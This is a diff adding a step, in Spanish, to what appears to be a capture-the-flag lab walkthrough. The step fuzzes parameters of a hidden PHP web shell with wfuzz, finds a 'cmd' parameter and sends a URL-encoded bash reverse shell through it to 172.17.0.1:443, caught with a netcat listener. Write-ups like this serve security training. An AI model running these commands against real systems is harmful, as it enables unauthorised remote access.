@@ -21,4 +21,16 @@ Una vez dentro de la página, si la inspeccionamos (o vemos su código fuente) e
 
 Dejándonos el subdirectorio oculto `/hidden/.shell.php`, y una vez dentro, veremos que no hay contenido alguno.
 
-## Paso N3: 
+## Paso N3: Parámetro vulnerable
+Una vez dentro de la página, no veremos mucha cosa más, por lo que empezaremos a fuzzear parámetros vulnerables con wfuzz
+```
+wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt --hw 0 -u 'http://172.17.0.2/hidden/.shell.php?FUZZ=id'
+```
+<img width="671" height="393" alt="image" src="https://github.com/user-attachments/assets/6b4fd71c-e666-4593-a2ee-6d4f64cd556c" />
+
+Encontramos el parámetro vulnerable `cmd`, por lo que si encodeamos a url `bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'`, escuchamos en una terminal en el puerto 443 con `nc -lvnp 443` y ponemos de comando la reverse shell encodeada a url habremos obtenido acceso al sistema 
+```
+http://172.17.0.2/hidden/.shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F443%200%3E%261%27%0A
+```
+<img width="670" height="196" alt="image" src="https://github.com/user-attachments/assets/5d79d850-f7e8-40c5-bdcc-92e8af6f0326" />
+
